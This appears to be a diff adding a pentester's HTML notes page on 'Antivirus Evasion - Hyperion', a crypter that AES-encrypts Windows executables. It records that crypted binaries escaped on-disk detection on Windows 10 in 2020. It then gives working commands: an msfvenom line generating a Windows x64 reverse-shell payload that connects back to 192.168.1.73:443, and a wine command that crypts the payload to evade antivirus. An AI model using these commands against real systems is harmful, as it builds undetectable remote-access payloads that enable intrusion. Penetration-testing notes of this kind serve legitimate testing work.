@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>Hyperion</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
+</head>
+<body>
+<div class='page'><strong><h1># Antivirus Evasion - Hyperion</h1></strong><br /><a href="https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/source">https://github.com/nullsecuritynet/tools/tree/master/binary/hyperion/source</a><br /><a href="https://nullsecurity.net/tools/binary.html">https://nullsecurity.net/tools/binary.html</a><br /><br />A runtime crypter for 32/64 bit portable executables. <br />It&#39;s a reference implementation and based on the paper <em>&quot;Hyperion: Implementation of a PE-Crypter&quot;</em>.<br /><br />The crypter is a C project.<br />It encrypts an input executable with AES-128. <br />The encrypted file decrypts itself on startup (bruteforcing the AES key which may take a few seconds) and generates a log file for debug purpose.<br /><br /><strong><h2>## Observations</h2></strong><br /><strong><h3>### 4th May 2020</h3></strong><br />As of 4th May 2020, against Windows 10 1809, didn&#39;t cause WerFault.exe.<br /><br />Crypted binary doesn&#39;t get detected on disk.<br />But, depending on payload, will get detected on execution.<br /><br />Probably best to encode the payload + hyperion, not just a generic msf payload by itself.<br /><br /><strong><h2>## Usage</h2></strong><br />Generate binary (example)<br /><code>msfvenom -a x64 --platform Windows -p windows/x64/shell_reverse_tcp LHOST=192.168.1.73 LPORT=443 -f exe -o binary.exe</code><br /><br />(Parrot OS) Crypt binary with <code>hyperion.exe</code> via <code>wine</code><br /><code>sudo wine /usr/share/windows-resources/hyperion/hyperion.exe binary.exe hyperion1.exe</code><br /></div>
+</body>
+</html>
